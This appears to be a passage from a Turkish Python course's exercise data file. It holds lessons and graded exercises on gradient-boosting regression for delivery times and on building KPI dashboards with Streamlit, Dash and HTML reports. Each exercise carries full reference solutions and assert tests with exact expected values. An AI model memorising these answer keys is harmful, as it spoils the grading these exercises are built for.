        sol: 'import veri\nimport pandas as pd\n\ndef kurye_verisi():\n    o = veri.oku("lezzet_kurye", "lk_orders")\n    r = veri.oku("lezzet_kurye", "lk_restaurants")\n    k = veri.oku("lezzet_kurye", "lk_couriers")\n    s = veri.oku("lezzet_kurye", "lk_order_lines")\n    o = o[o["status"] == "teslim"].copy()\n    zaman = pd.to_datetime(o["placed_at"])\n    o["saat"] = zaman.dt.hour\n    o["hafta_sonu"] = (zaman.dt.dayofweek >= 5).astype(int)\n    o["sure_dk"] = (pd.to_datetime(o["delivered_at"]) - zaman).dt.total_seconds() / 60\n    adet = s.groupby("order_id")["qty"].sum().rename("adet").reset_index()\n    d = (o.merge(r[["restaurant_id", "cuisine", "city"]], on="restaurant_id")\n          .merge(k[["courier_id", "vehicle"]], on="courier_id")\n          .merge(adet, on="order_id"))\n    d["restoran"] = d["restaurant_id"].astype(str)\n    X = d[["saat", "hafta_sonu", "adet", "cuisine", "city", "vehicle", "restoran"]].copy()\n    for c in ["cuisine", "city", "vehicle", "restoran"]:\n        X[c] = X[c].astype("category")\n    return X, d["sure_dk"]\nfrom sklearn.model_selection import train_test_split\nX, y = kurye_verisi()\nX_tr, X_te, y_tr, y_te = train_test_split(X, y, test_size=0.25, random_state=0)\nKATEGORIK = ["cuisine", "city", "vehicle", "restoran"]\nfrom sklearn.ensemble import HistGradientBoostingRegressor\n\ndef tur_sayilari(X_tr, y_tr, oranlar):\n    sonuc = {}\n    for oran in oranlar:\n        m = HistGradientBoostingRegressor(categorical_features=KATEGORIK, learning_rate=oran, max_iter=1000,\n                                          max_leaf_nodes=15, early_stopping=True, n_iter_no_change=10, random_state=0)\n        sonuc[oran] = int(m.fit(X_tr, y_tr).n_iter_)\n    return sonuc\n',
        tests: 't = tur_sayilari(X_tr, y_tr, [0.3, 0.03])\nassert set(t) == {0.3, 0.03}, "Her oran için bir giriş olmalı"\nassert t[0.03] > t[0.3], f"Küçük öğrenme hızı daha çok tur gerektirmeli: {t}"\nassert all(n < 1000 for n in t.values()), "Erken durdurma devrede olmalı"\n',
        hints: ['Döngüde her oran için yeni bir model kur.', 'Eğitilmiş modelin n_iter_ alanı gerçekleşen tur sayısıdır.'],
        why: 'Öğrenme hızı ile tur sayısı ters orantılı çalışır; bu yüzden ikisini birlikte ayarlarsın. Erken durdurma doğru tur sayısını senin yerine bulur.' },
      { t: 'code',
        id: 'ml-regresyon-siniflandirma-w5',
        stage: 'Hata avı',
        kind: 'bug',
        diff: 2,
        needs: ['pandas'],
        q: '<p>Hatayı bul ve düzelt. <code>model_kur(df)</code> teslim süresini tahmin eden modeli eğitiyor ama <code>ValueError</code> veriyor: kategorik sütunlar metin hâlinde kalmış. Düzeltince de model hep <code>max_iter</code> kadar tur dönüyor; erken durdurma çalışmıyor (veri 10.000 satırdan küçük olduğu için "auto" kapalı kalıyor). İki sorunu düzelt; fonksiyon eğitilmiş modeli döndürsün.</p>',
        start: 'import pandas as pd\nfrom sklearn.ensemble import HistGradientBoostingRegressor\n\ndef model_kur(df):\n    X = df[["adet", "arac", "mutfak"]].copy()\n    model = HistGradientBoostingRegressor(categorical_features=["arac", "mutfak"],\n                                          max_iter=300, n_iter_no_change=5, random_state=0)\n    return model.fit(X, df["sure"])\n',
        sol: 'import pandas as pd\nfrom sklearn.ensemble import HistGradientBoostingRegressor\n\ndef model_kur(df):\n    X = df[["adet", "arac", "mutfak"]].copy()\n    for c in ["arac", "mutfak"]:\n        X[c] = X[c].astype("category")\n    model = HistGradientBoostingRegressor(categorical_features=["arac", "mutfak"], early_stopping=True,\n                                          max_iter=300, n_iter_no_change=5, random_state=0)\n    return model.fit(X, df["sure"])\n',
        tests: 'import numpy as np\nrng = np.random.default_rng(0)\nn = 600\ndf = pd.DataFrame({"adet": rng.integers(1, 6, n), "arac": rng.choice(["moto", "araba"], n),\n                   "mutfak": rng.choice(["pizza", "döner", "tatlı"], n)})\ndf["sure"] = 20 + df["adet"] * 2 + (df["arac"] == "araba") * 5 + rng.normal(0, 3, n)\nm = model_kur(df)\nassert m.n_iter_ < 300, f"Erken durdurma açık olmalı; model {m.n_iter_} tur döndü"\nassert int(m.is_categorical_.sum()) == 2, "İki kategorik sütun tanınmalı"\n',
        hints: ['HGB metin sütunlarını sayıya çeviremez; pandas category tipine dönüştür.', 'early_stopping="auto" yalnız 10.000 satırdan büyük veride açılır; açıkça True ver.'],
        why: 'Doğal kategorik destek, sütunun category tipinde (ya da önceden sayıya kodlanmış) olmasını ister. n_iter_no_change tek başına yetmez; early_stopping açık değilse hiç kullanılmaz.' },
      { t: 'code',
        id: 'ml-regresyon-siniflandirma-w6',
        stage: 'Meydan okuma',
        diff: 3,
        needs: ['pandas'],
        q: '<p>İş kuralı: "Sepetteki ürün adedi artınca tahmini teslim süresi <b>azalmamalı</b>." <code>monoton_model(X_tr, y_tr)</code> yaz: <code>monotonic_cst={"adet": 1}</code> ile HGB kur (diğer ayarlar: <code>categorical_features=KATEGORIK</code>, <code>max_leaf_nodes=15</code>, <code>early_stopping=True</code>, <code>random_state=0</code>) ve eğitilmiş modeli döndür. Sonra <code>monoton_mu(model, X, sutun, degerler)</code> yaz: X\'in her satırı için sütunu sırayla verilen değerlere sabitleyip tahmin etsin; <b>her satırda</b> tahminler azalmayan sıradaysa (1e-9 toleransla) <code>True</code> döndürsün.</p>',
        start: 'import veri\nimport pandas as pd\n\ndef kurye_verisi():\n    o = veri.oku("lezzet_kurye", "lk_orders")\n    r = veri.oku("lezzet_kurye", "lk_restaurants")\n    k = veri.oku("lezzet_kurye", "lk_couriers")\n    s = veri.oku("lezzet_kurye", "lk_order_lines")\n    o = o[o["status"] == "teslim"].copy()\n    zaman = pd.to_datetime(o["placed_at"])\n    o["saat"] = zaman.dt.hour\n    o["hafta_sonu"] = (zaman.dt.dayofweek >= 5).astype(int)\n    o["sure_dk"] = (pd.to_datetime(o["delivered_at"]) - zaman).dt.total_seconds() / 60\n    adet = s.groupby("order_id")["qty"].sum().rename("adet").reset_index()\n    d = (o.merge(r[["restaurant_id", "cuisine", "city"]], on="restaurant_id")\n          .merge(k[["courier_id", "vehicle"]], on="courier_id")\n          .merge(adet, on="order_id"))\n    d["restoran"] = d["restaurant_id"].astype(str)\n    X = d[["saat", "hafta_sonu", "adet", "cuisine", "city", "vehicle", "restoran"]].copy()\n    for c in ["cuisine", "city", "vehicle", "restoran"]:\n        X[c] = X[c].astype("category")\n    return X, d["sure_dk"]\nfrom sklearn.model_selection import train_test_split\nX, y = kurye_verisi()\nX_tr, X_te, y_tr, y_te = train_test_split(X, y, test_size=0.25, random_state=0)\nKATEGORIK = ["cuisine", "city", "vehicle", "restoran"]\n\ndef monoton_model(X_tr, y_tr):\n    pass\n\ndef monoton_mu(model, X, sutun, degerler):\n    pass\n',
        sol: 'import veri\nimport pandas as pd\n\ndef kurye_verisi():\n    o = veri.oku("lezzet_kurye", "lk_orders")\n    r = veri.oku("lezzet_kurye", "lk_restaurants")\n    k = veri.oku("lezzet_kurye", "lk_couriers")\n    s = veri.oku("lezzet_kurye", "lk_order_lines")\n    o = o[o["status"] == "teslim"].copy()\n    zaman = pd.to_datetime(o["placed_at"])\n    o["saat"] = zaman.dt.hour\n    o["hafta_sonu"] = (zaman.dt.dayofweek >= 5).astype(int)\n    o["sure_dk"] = (pd.to_datetime(o["delivered_at"]) - zaman).dt.total_seconds() / 60\n    adet = s.groupby("order_id")["qty"].sum().rename("adet").reset_index()\n    d = (o.merge(r[["restaurant_id", "cuisine", "city"]], on="restaurant_id")\n          .merge(k[["courier_id", "vehicle"]], on="courier_id")\n          .merge(adet, on="order_id"))\n    d["restoran"] = d["restaurant_id"].astype(str)\n    X = d[["saat", "hafta_sonu", "adet", "cuisine", "city", "vehicle", "restoran"]].copy()\n    for c in ["cuisine", "city", "vehicle", "restoran"]:\n        X[c] = X[c].astype("category")\n    return X, d["sure_dk"]\nfrom sklearn.model_selection import train_test_split\nX, y = kurye_verisi()\nX_tr, X_te, y_tr, y_te = train_test_split(X, y, test_size=0.25, random_state=0)\nKATEGORIK = ["cuisine", "city", "vehicle", "restoran"]\nimport numpy as np\nfrom sklearn.ensemble import HistGradientBoostingRegressor\n\ndef monoton_model(X_tr, y_tr):\n    m = HistGradientBoostingRegressor(categorical_features=KATEGORIK, monotonic_cst={"adet": 1},\n                                      max_leaf_nodes=15, early_stopping=True, random_state=0)\n    return m.fit(X_tr, y_tr)\n\ndef monoton_mu(model, X, sutun, degerler):\n    sutunlar = []\n    for v in degerler:\n        kopya = X.copy()\n        kopya[sutun] = v\n        sutunlar.append(model.predict(kopya))\n    tahmin = np.column_stack(sutunlar)\n    return bool(np.all(np.diff(tahmin, axis=1) >= -1e-9))\n',
        tests: 'import numpy as np\nclass Artan:\n    def predict(self, X):\n        return X["adet"].to_numpy() * 2.0\nclass Bozuk:\n    def predict(self, X):\n        return np.where(X["adet"].to_numpy() == 3, 0.0, 10.0)\nornek = X_te.head(20)\nassert monoton_mu(Artan(), ornek, "adet", [1, 2, 3]) is True\nassert monoton_mu(Bozuk(), ornek, "adet", [1, 2, 3, 4]) is False, "3\\\'te düşen tahmin yakalanmalı"\nm = monoton_model(X_tr, y_tr)\nassert monoton_mu(m, X_te.head(200), "adet", list(range(1, 11))), "Kısıtlı modelde süre adetle azalmamalı"\nassert len(ornek) == 20 and ornek["adet"].dtype.kind in "iu", "monoton_mu X\\\'i değiştirmemeli"\n',
        hints: ['monotonic_cst sözlüğünde 1 artan, -1 azalan, 0 kısıtsız demektir.', 'Her değer için kopyada sütunu sabitle, tahmin sütunlarını np.column_stack ile yan yana koy.', 'np.diff(tahmin, axis=1) satır içindeki ardışık farkları verir; hepsi ≥ -1e-9 olmalı.'],
        why: 'Monoton kısıtlar, modeli iş mantığıyla uyumlu tutar ve düzenleyiciler (kredi skor kartı gibi) tarafından sıkça istenir. Bu denetim aslında bir ICE testidir: her satırın eğrisi artan olmalı.' }
    ],
    faq: [
      { q: 'HistGradientBoosting mi, XGBoost/LightGBM mi kullanmalıyım?',
        a: 'Ek bağımlılık istemediğin ve verin yüz binlerce satır civarında olduğu sürece HGB çok iyi bir varsayılandır. Çok büyük veri, GPU eğitimi, özel kayıp fonksiyonları ya da ekip standardı gerekiyorsa XGBoost/LightGBM seç. Üçünün sonuçları iyi ayarlandığında genellikle birbirine yakındır; farkı veri ve özellikler yaratır.' },
      { q: 'Boosting modeline ölçekleme (StandardScaler) gerekir mi?',
        a: 'Hayır. Ağaçlar eşik karşılaştırmasıyla böler; sütunun ölçeği sonucu değiştirmez. Eksik değerler de HGB\'de doldurulmadan kullanılabilir. Pipeline\'da yalnızca kategorik dönüşüm ve özellik üretimi kalır.' }
    ],
    mistakes: [
      { bad: 'model = HistGradientBoostingRegressor(n_iter_no_change=10)  # 5 bin satır',
        good: 'model = HistGradientBoostingRegressor(early_stopping=True, n_iter_no_change=10)',
        why: 'early_stopping="auto" yalnız 10.000 satırın üstünde açılır; küçük veride açıkça True ver.' }
    ] }
);
})(window);
/* Kesit Python — 'seaborn-plotly' dersi uzantısı: panoya geçiş: KPI, Streamlit/Dash gösterimi, pano tasarımı, veri hikâyesi, tek dosyalık HTML rapor (AUDIT Ekle-3) */
(function (W) {
'use strict';
const X = W.PY_EXT = W.PY_EXT || [];
X.push(
  { id: 'seaborn-plotly',
    min: 28,
    html: `<h2>Derinleş: grafikten panoya ve rapora</h2><p>Tek grafik bir soruyu cevaplar; <b>pano</b> (dashboard) ise bir ekibin her sabah baktığı soruları tek ekranda toplar. Bu bölümde Python'la pano kurmanın iki popüler yolunu (Streamlit ve Dash), iyi pano tasarımının ilkelerini, veri hikâyesinin akışını ve e-postayla gönderilebilen <b>tek dosyalık HTML rapor</b> üretmeyi göreceksin. Rakamlar Kesit Power BI'ın <code>kesit_bi.Satislar</code> tablosundan (1620 satış satırı) geliyor; aynı panoyu orada Power BI ile kuruyorsun.</p><h3>Önce rakamlar: KPI hesabı</h3><pre class="py">import veri
import pandas as pd

s = veri.oku("kesit_bi", "Satislar")
s = s[s["Durum"] != "İptal"].copy()
s["YilAy"] = s["Tarih"].str[:7]

def kpi(df):
    ciro = df["Tutar"].sum()
    siparis = df["SiparisNo"].nunique()
    return {"ciro": round(ciro), "siparis": siparis, "sepet": round(ciro / siparis),
            "marj": round(1 - df["Maliyet"].sum() / ciro, 3)}

bu = kpi(s[s["YilAy"] == "2024-12"])
onceki = kpi(s[s["YilAy"] == "2024-11"])
for ad in bu:
    degisim = (bu[ad] - onceki[ad]) / onceki[ad]
    print(f"{ad:&lt;8} {bu[ad]:&gt;10,}  ({degisim:+.1%} geçen aya göre)")</pre><h3>Streamlit: betikten uygulamaya</h3><p>Streamlit'te uygulama yukarıdan aşağı çalışan bir betiktir; kullanıcı bir filtreyi her değiştirdiğinde betik baştan çalışır. Bu yüzden veriyi okuyan fonksiyon <code>@st.cache_data</code> ile önbelleğe alınır. <code>pip install streamlit</code> ve <code>streamlit run pano.py</code> ile kendi bilgisayarında dene:</p><pre class="code"># pano.py
import pandas as pd
import plotly.express as px
import streamlit as st

st.set_page_config(page_title="Kesit Satış Panosu", layout="wide")

@st.cache_data
def yukle():
    s = pd.read_csv("Satislar.csv")
    return s[s["Durum"] != "İptal"].assign(YilAy=lambda d: d["Tarih"].str[:7])

s = yukle()
kanallar = st.sidebar.multiselect("Kanal", sorted(s["Kanal"].unique()), default=sorted(s["Kanal"].unique()))
ay = st.sidebar.selectbox("Ay", sorted(s["YilAy"].unique(), reverse=True))
f = s[s["Kanal"].isin(kanallar)]

k1, k2, k3 = st.columns(3)
bu, onceki = f[f["YilAy"] == ay], f[f["YilAy"] &lt; ay]
k1.metric("Ciro", f"{bu['Tutar'].sum():,.0f} TL")
k2.metric("Sipariş", bu["SiparisNo"].nunique())
k3.metric("Ortalama sepet", f"{bu['Tutar'].sum() / max(bu['SiparisNo'].nunique(), 1):,.0f} TL")

aylik = f.groupby("YilAy", as_index=False)["Tutar"].sum()
st.plotly_chart(px.line(aylik, x="YilAy", y="Tutar", title="Aylık ciro"), use_container_width=True)
st.dataframe(bu.groupby("Kanal")["Tutar"].sum().sort_values(ascending=False))</pre><h3>Dash: bileşen ve geri çağırma</h3><p>Dash (Plotly'nin çatısı) farklı bir model kullanır: sayfa düzeni bileşen ağacıdır, etkileşim ise girdi ve çıktıları açıkça bağlayan <b>geri çağırma</b> (callback) fonksiyonlarıyla kurulur. Yalnız etkilenen bileşen yeniden hesaplanır; daha çok kod ister ama büyük, çok sayfalı panolarda daha kontrollüdür (<code>pip install dash</code>).</p><pre class="code">from dash import Dash, Input, Output, dcc, html
import plotly.express as px

app = Dash(__name__)
app.layout = html.Div([
    dcc.Dropdown(sorted(s["Kanal"].unique()), "Mobil", id="kanal"),
    dcc.Graph(id="grafik"),
])

@app.callback(Output("grafik", "figure"), Input("kanal", "value"))
def guncelle(kanal):
    aylik = s[s["Kanal"] == kanal].groupby("YilAy", as_index=False)["Tutar"].sum()
    return px.bar(aylik, x="YilAy", y="Tutar")

app.run(debug=True)</pre><div class="tbl-wrap"><table><tr><th></th><th>Streamlit</th><th>Dash</th><th>Power BI</th></tr><tr><td>Öğrenme</td><td>En kolay</td><td>Orta (callback)</td><td>Tıkla-sürükle + DAX</td></tr><tr><td>Ne zaman?</td><td>Hızlı prototip, ML demosu, iç araç</td><td>Özelleştirilmiş, büyük web panosu</td><td>Kurumsal raporlama, yetki, paylaşım</td></tr><tr><td>Yayın</td><td>Streamlit Community Cloud, sunucu</td><td>Herhangi bir Python web sunucusu</td><td>Power BI Hizmeti</td></tr></table></div><h3>Pano tasarım ilkeleri</h3><ul><li><b>Üstte KPI kartları:</b> 3–5 ana sayı, her birinin yanında karşılaştırma (geçen ay, hedef) ve yönü. Karşılaştırmasız sayı anlam taşımaz.</li><li><b>Soldan sağa, yukarıdan aşağı ayrıntıya:</b> özet → eğilim (zaman çizgisi) → kırılım (kanal, kategori) → ayrıntı tablosu.</li><li><b>Filtreler tek yerde</b> (kenar çubuğu ya da üst şerit) ve hepsini etkiler; etkin filtre ekranda görünsün.</li><li><b>Ayrıntıya inme</b> (drill-down): bölge → şehir → müşteri gibi hiyerarşide tıklayarak inmek; her seviyede toplamlar tutarlı olmalı.</li><li><b>Az renk:</b> gri temel, vurgu yalnız dikkat çekilecek yerde; kırmızı/yeşil yerine erişilebilir palet (bu dersteki renk bölümü).</li></ul><p><b>Veri hikâyesi</b> akışı panodan farklıdır; tek bir mesajı iletir: <b>bağlam</b> ("Aralık'ta ciro geçen yıla göre arttı"), <b>gerilim</b> ("ama iade oranı Mağaza kanalında iki katına çıktı"), <b>çözüm</b> ("Mağaza iade sürecinin incelenmesini öneriyoruz"). Her grafiğin başlığı bir bulgu cümlesi olsun: "Aylık ciro" değil, "Ciro Aralık'ta yılın zirvesine çıktı".</p><h3>Tek dosyalık HTML rapor</h3><p>Herkesin tarayıcısı vardır; sunucu kurmadan paylaşılabilecek en pratik çıktı tek bir HTML dosyasıdır. Grafikleri <b>base64</b> ile gömersen dosya dışa bağımlılık olmadan açılır. plotly ile etkileşimli rapor için <code>fig.to_html(full_html=False, include_plotlyjs="cdn")</code> parçalarını birleştirirsin (ya da çevrimdışı için <code>include_plotlyjs=True</code>).</p><pre class="py">import base64, html, io
import matplotlib
matplotlib.use("Agg")
import matplotlib.pyplot as plt

aylik = s[s["YilAy"].str.startswith("2024")].groupby("YilAy")["Tutar"].sum()
fig, ax = plt.subplots(figsize=(6, 2.5))
ax.plot(aylik.index.str[5:], aylik.values, color="#2a6f97")
ax.set_title("2024'te ciro yıl sonuna doğru yükseldi")
tampon = io.BytesIO()
fig.savefig(tampon, format="png", dpi=100, bbox_inches="tight")
plt.close(fig)
png = base64.b64encode(tampon.getvalue()).decode()

rapor = f"""&lt;!doctype html&gt;&lt;html lang="tr"&gt;&lt;meta charset="utf-8"&gt;
&lt;title&gt;{html.escape("Satış Raporu — Aralık 2024")}&lt;/title&gt;
&lt;h1&gt;Aralık 2024&lt;/h1&gt;&lt;p&gt;Ciro: {bu['ciro']:,} TL&lt;/p&gt;
&lt;img alt="Aylık ciro" src="data:image/png;base64,{png}"&gt;&lt;/html&gt;"""
print(len(rapor), "karakter; görsel gömülü:", "data:image/png;base64," in rapor)</pre><div class="note"><b>Gerçek işte</b>Analistler genellikle iki çıktı üretir: kurumsal pano (Power BI, Tableau, Looker) ve haftalık/aylık yorumlu rapor (HTML, PDF, e-posta). Streamlit ise veri bilimi ekiplerinin model sonuçlarını paydaşa göstermesinin en hızlı yoludur. Hangi aracı seçersen seç, mülakatlarda değerlendirilen şey aynıdır: doğru KPI, karşılaştırma, temiz hiyerarşi ve tek cümlelik bulgu.</div>`,
    ex: [
      { t: 'mc',
        stage: 'Isınma',
        q: 'Streamlit panosunda kenar çubuğundaki kanal filtresini her değiştirdiğinde sayfa birkaç saniye donuyor. Betikte veri her seferinde <code>pd.read_csv</code> ile okunuyor. En doğru düzeltme hangisi?',
        o: ['Veriyi okuyan fonksiyonu @st.cache_data ile önbelleğe almak', 'Filtreyi kaldırıp bütün kanalları her zaman tek grafikte göstermek', 'Streamlit yerine Excel dosyasını e-postayla göndermeye geri dönmek', 'CSV dosyasını her filtrede yeniden oluşturup diske tekrar yazmak'],
        a: 0,
        why: 'Streamlit her etkileşimde betiği baştan çalıştırır. cache_data, aynı argümanlarla çağrılan fonksiyonun sonucunu saklar; dosya bir kez okunur ve filtreler yalnız bellekteki tabloyu süzer.' },
      { t: 'mc',
        stage: 'Isınma',
        q: 'Yönetici panosunun en üst satırına konacak bir KPI kartı için en iyi tasarım hangisi?',
        o: ['"Ciro: 54.312 TL" — yalnız sayı, sade görünüm', '"Ciro: 54.312 TL ▲ %8,4 geçen aya göre" — sayı, karşılaştırma ve yön', 'Ciroyu gösteren 12 dilimli renkli bir pasta grafiği', 'Tüm siparişlerin satır satır listelendiği kaydırmalı bir tablo'],
        a: 1,
        why: 'Karşılaştırmasız sayı "iyi mi kötü mü?" sorusunu cevaplamaz. KPI kartı tek bakışta okunmalı: değer, referans (geçen ay, hedef) ve yön. Pasta ve uzun tablo ayrıntı içindir, üst satır için değil.' },
      { t: 'predict',
        stage: 'Kodu oku',
        q: 'KPI kartı için değişim metni biçimlendiriliyor. Bu kod ne yazdırır?',
        code: 'def degisim(bu, onceki):\n    if not onceki:\n        return "—"\n    o = (bu - onceki) / onceki\n    ok = "▲" if o > 0 else "▼" if o < 0 else "="\n    return f"{ok} {abs(o):.1%}"\n\nprint(degisim(54312, 50100), degisim(900, 1000), degisim(5, 0), degisim(7, 7))\n',
        o: ['▲ 8.4% ▼ 10.0% — = 0.0%', '▲ 8.4% ▼ -10.0% — = 0.0%', '▲ 0.1% ▼ 0.1% — = 0.0%', '▲ 8.4% ▼ 10.0% ZeroDivisionError'],
        a: 0,
        why: '(54312 − 50100) / 50100 ≈ 0.084 → %8.4; 900\'ün 1000\'e göre değişimi −%10, abs ile işaretsiz yazılır ve yönü ok verir. Önceki değer 0 ise bölme yapılmaz ve "—" döner.' },
      { t: 'code',
        id: 'seaborn-plotly-w1',
        stage: 'Rehberli',
        diff: 2,
        needs: ['pandas'],
        q: '<p>Gerçek <code>kesit_bi.Satislar</code> verisinden KPI kartları: <code>kpi(df)</code> bir dönemin satırlarından <code>{"ciro", "siparis", "sepet", "marj"}</code> sözlüğü döndürsün: ciro = Tutar toplamı (2 basamak), siparis = benzersiz SiparisNo sayısı (int), sepet = ciro / siparis (2 basamak), marj = 1 − Maliyet toplamı / ciro (3 basamak). Boş dönemde hepsi 0 olsun. Veri (iptaller atılmış, <code>YilAy</code> sütunu eklenmiş) hazır.</p>',
        guide: ['Boş DataFrame\'i başta yakala.', 'Tutar toplamını ve SiparisNo.nunique() değerini hesapla.', 'Sepeti ve marjı bu iki değerden türet.', 'Değerleri float/int\'e çevirip yuvarla.'],
        example: 'import pandas as pd\ndf = pd.DataFrame({"no": [1, 1, 2], "t": [10.0, 5.0, 20.0]})\nprint(df["t"].sum(), df["no"].nunique())\n',
        start: 'import veri\nimport pandas as pd\n\ns = veri.oku("kesit_bi", "Satislar")\ns = s[s["Durum"] != "İptal"].copy()\ns["YilAy"] = s["Tarih"].str[:7]\n\ndef kpi(df):\n    # TODO: boş dönem kontrolü\n    # TODO: ciro, siparis, sepet, marj\n    return {}\n',
        sol: 'import veri\nimport pandas as pd\n\ns = veri.oku("kesit_bi", "Satislar")\ns = s[s["Durum"] != "İptal"].copy()\ns["YilAy"] = s["Tarih"].str[:7]\ndef kpi(df):\n    if df.empty:\n        return {"ciro": 0, "siparis": 0, "sepet": 0, "marj": 0}\n    ciro = float(df["Tutar"].sum())\n    siparis = int(df["SiparisNo"].nunique())\n    return {"ciro": round(ciro, 2), "siparis": siparis,\n            "sepet": round(ciro / siparis, 2),\n            "marj": round(1 - float(df["Maliyet"].sum()) / ciro, 3)}\n',
        tests: 'assert kpi(s[s["YilAy"] == "2024-12"]) == {\'ciro\': 94000.95, \'siparis\': 58, \'sepet\': 1620.71, \'marj\': 0.393}, "Aralık 2024 KPI değerleri beklenenden farklı"\nassert kpi(s[s["YilAy"] == "2024-11"]) == {\'ciro\': 89055.6, \'siparis\': 58, \'sepet\': 1535.44, \'marj\': 0.376}\nassert kpi(s[s["YilAy"] == "2030-01"]) == {"ciro": 0, "siparis": 0, "sepet": 0, "marj": 0}, "Boş dönemde sıfırlar"\nassert type(kpi(s)["siparis"]) is int\n',
        hints: ['Bir siparişte birden çok satır olduğu için sipariş sayısı satır sayısı değildir: nunique.', 'Marj: 1 - maliyet / ciro.'],
        why: 'Ortalama sepet "satır başına" değil "sipariş başına" hesaplanır; aksi hâlde çok kalemli siparişler sepeti olduğundan küçük gösterir. Boş dönem kontrolü pano filtresi hiç veri bırakmadığında sıfıra bölmeyi önler.' },
      { t: 'code',
        id: 'seaborn-plotly-w2',
        stage: 'Rehberli',
        diff: 2,
        needs: ['pandas'],
        q: '<p>Pano filtre katmanı: <code>filtrele(df, kanallar=None, ay_bas=None, ay_bit=None)</code>. <code>kanallar</code> liste ise yalnız o kanallar; <code>None</code> ise filtre yok; <b>boş liste</b> hiçbir satır döndürmez (Streamlit multiselect\'te her şey kaldırılınca). <code>ay_bas</code>/<code>ay_bit</code> <code>"YYYY-AA"</code> biçiminde, iki uç dahil. Orijinal tabloyu değiştirme. Gerçek veri hazır.</p>',
        guide: ['Boolean maske olarak pd.Series(True, index=df.index) ile başla.', 'Her filtre verildiyse maskeyi & ile daralt; kanallar için isin.', 'Ay karşılaştırması metinle yapılabilir: "2024-03" <= "2024-10".', 'df[maske] döndür.'],
        example: 'import pandas as pd\ndf = pd.DataFrame({"k": ["a", "b", "c"], "ay": ["2024-01", "2024-02", "2024-03"]})\nm = pd.Series(True, index=df.index)\nm &= df["k"].isin(["a", "c"])\nm &= df["ay"] >= "2024-02"\nprint(df[m])\n',
        start: 'import veri\nimport pandas as pd\n\ns = veri.oku("kesit_bi", "Satislar")\ns = s[s["Durum"] != "İptal"].copy()\ns["YilAy"] = s["Tarih"].str[:7]\n\ndef filtrele(df, kanallar=None, ay_bas=None, ay_bit=None):\n    maske = pd.Series(True, index=df.index)\n    # TODO: filtreleri uygula\n    return df\n',
        sol: 'import veri\nimport pandas as pd\n\ns = veri.oku("kesit_bi", "Satislar")\ns = s[s["Durum"] != "İptal"].copy()\ns["YilAy"] = s["Tarih"].str[:7]\ndef filtrele(df, kanallar=None, ay_bas=None, ay_bit=None):\n    maske = pd.Series(True, index=df.index)\n    if kanallar is not None:\n        maske &= df["Kanal"].isin(kanallar)\n    if ay_bas is not None:\n        maske &= df["YilAy"] >= ay_bas\n    if ay_bit is not None:\n        maske &= df["YilAy"] <= ay_bit\n    return df[maske]\n',
        tests: 'f = filtrele(s, ["Mobil"], "2024-10", "2024-12")\nassert f.groupby("YilAy")["Tutar"].sum().round(2).to_dict() == {\'2024-10\': 32563.65, \'2024-11\': 38595.8, \'2024-12\': 31924.35}, "Mobil, 2024 son çeyrek aylık ciro"\nassert len(filtrele(s)) == len(s), "Filtre yoksa tüm satırlar"\nassert len(filtrele(s, [])) == 0, "Boş kanal listesi hiçbir satır döndürmemeli (None ile karıştırma)"\nassert set(filtrele(s, ay_bas="2024-12")["YilAy"]) == {"2024-12"}\nassert "Kanal" in s.columns and len(s) == 1499, "Orijinal tablo değişmemeli"\n',
        hints: ['"if kanallar:" boş listeyi "filtre yok" sanır; "if kanallar is not None:" kullan.', 'maske &= koşul ile filtreleri art arda ekle.'],
        why: 'Pano filtrelerinde "seçilmemiş" (None) ile "hepsi kaldırılmış" (boş liste) farklı anlamlardır. İkisini karıştırmak, kullanıcı tüm kanalları kaldırdığında panonun yine tüm veriyi göstermesine yol açar.' },
      { t: 'code',
        id: 'seaborn-plotly-w3',
        stage: 'Kendin yaz',
        diff: 2,
        needs: ['pandas'],
        q: '<p>Ayrıntıya inme (drill-down): <code>ayrinti(df, musteri, yol)</code>. <code>yol</code> seçilmiş seviyelerin listesi: <code>[]</code> → bölge toplamları; <code>["Marmara"]</code> → Marmara\'daki şehir toplamları. <code>df</code> satış satırları, <code>musteri</code> müşteri boyutu (MusteriNo, Bolge, Sehir); boş Bolge/Sehir <code>"Bilinmiyor"</code> sayılır. Dönüş: <code>{ad: tutar}</code> sözlüğü, tutar 2 basamak, büyükten küçüğe. Test, 2024 satışlarında gerçek <code>kesit_bi.Musteriler</code> ile çalışır.</p>',
        start: 'import veri\nimport pandas as pd\n\ns = veri.oku("kesit_bi", "Satislar")\ns = s[s["Durum"] != "İptal"].copy()\ns["YilAy"] = s["Tarih"].str[:7]\nmusteri = veri.oku("kesit_bi", "Musteriler")\ns24 = s[s["YilAy"].str.startswith("2024")]\n\ndef ayrinti(df, musteri, yol):\n    pass\n',
        sol: 'import veri\nimport pandas as pd\n\ns = veri.oku("kesit_bi", "Satislar")\ns = s[s["Durum"] != "İptal"].copy()\ns["YilAy"] = s["Tarih"].str[:7]\nmusteri = veri.oku("kesit_bi", "Musteriler")\ns24 = s[s["YilAy"].str.startswith("2024")]\nSEVIYELER = ["Bolge", "Sehir"]\n\ndef ayrinti(df, musteri, yol):\n    boyut = musteri[["MusteriNo"] + SEVIYELER].fillna({c: "Bilinmiyor" for c in SEVIYELER})\n    t = df.merge(boyut, on="MusteriNo", validate="many_to_one")\n    for seviye, deger in zip(SEVIYELER, yol):\n        t = t[t[seviye] == deger]\n    grup = SEVIYELER[len(yol)]\n    toplam = t.groupby(grup)["Tutar"].sum().sort_values(ascending=False)\n    return {k: round(float(v), 2) for k, v in toplam.items()}\n',
        tests: 'b = ayrinti(s24, musteri, [])\nassert b == {\'İç Anadolu\': 255512.8, \'Marmara\': 155605.3, \'Akdeniz\': 112878.6, \'Karadeniz\': 79834.35, \'Ege\': 74048.3, \'Bilinmiyor\': 40514.45, \'Güneydoğu Anadolu\': 28671.9}, "2024 bölge toplamları"\nassert ayrinti(s24, musteri, ["Marmara"]) == {\'İstanbul\': 115565.0, \'Bursa\': 40040.3}, "Marmara\\\'nın şehir kırılımı"\nassert abs(sum(ayrinti(s24, musteri, ["Marmara"]).values()) - b["Marmara"]) < 0.05, "Alt seviyelerin toplamı üst seviyeye eşit olmalı"\n',
        hints: ['Seviye listesi tut: ["Bolge", "Sehir"]; yol uzunluğu bir sonraki gruplama seviyesini verir.', 'zip(SEVIYELER, yol) ile seçilmiş seviyeleri sırayla filtrele.'],
        why: 'Ayrıntıya inmede her seviyenin toplamı üst seviyedeki değere eşit olmalıdır; boş değerleri "Bilinmiyor" yapmak bu tutarlılığı korur. Power BI\'daki hiyerarşi ve drill-down düğmeleri tam olarak bu mantıkla çalışır.' },
      { t: 'code',
        id: 'seaborn-plotly-w4',
